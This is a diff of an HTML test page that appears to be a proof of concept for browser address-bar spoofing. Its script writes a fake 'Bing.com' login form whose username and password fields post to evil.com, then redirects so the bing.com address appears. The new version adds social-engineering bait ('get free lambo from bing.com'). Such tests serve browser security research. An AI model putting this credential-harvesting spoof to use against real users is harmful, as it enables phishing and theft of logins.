@@ -1,12 +1,12 @@
 <script>  
-  function spoof() { 
-  document.write("<html><title>Bing.com</title><form Method=POST Action=//evil.com Name=form><br /><br />Login:<br/><input name=login><br />Password:<br/><input name=Password type=password><br/><br/><input type=submit name=Valid value=Ok></form></html>");  
-  document.location = "https://bing.com:1234"; 
-    setInterval(function(){document.location="https://bing.com";},11119800); 
-  }; 
-</script> 
-
-<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case"  onclick="spoof();" />
-<a href="  bing.com">
-<span>Drag me</span>
-</a>
+    function spoof() { 
+    document.write("<html><title>Bing.com</title><form Method=POST Action=//evil.com Name=form><br /><br />Login:<br/><input name=login><br />Password:<br/><input name=Password type=password><br/><br/><input type=submit name=Valid value=Ok></form></html>");  
+    document.location = "https://bing.com:1234"; 
+      setInterval(function(){document.location="https://bing.com:1234";},11119800); 
+    }; 
+  </script> 
+  
+  <p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case"  onclick="spoof();" />
+  <a href=https://bing.com:1234>
+  <span>Drag me to your address bar and click Run test case to get free lambo from bing.com</span>
+  </a>
